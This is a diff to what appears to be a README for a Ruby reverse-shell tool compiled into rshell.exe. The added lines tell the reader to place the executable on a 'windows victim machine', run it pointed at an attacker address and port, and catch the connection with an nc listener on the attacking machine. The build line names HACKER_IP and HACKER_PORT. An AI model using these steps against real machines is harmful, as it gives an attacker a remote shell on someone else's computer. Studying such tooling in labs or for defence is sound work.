@@ -77,6 +77,17 @@ ruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]
 === Finished building rshell.exe (2756229 bytes)
 ```
 
+In the same directory, you'll find an exe file rshell.exe. Put it on the windows victim machine which dosen't have ruby installed and run it
+
+```
+rshell.exe 192.168.0.14 9911 
+```
+
+from our attacking machine we already listening on 9911
+```
+nc -lvp 9911
+```
+
 
 
 ### Traveling-ruby
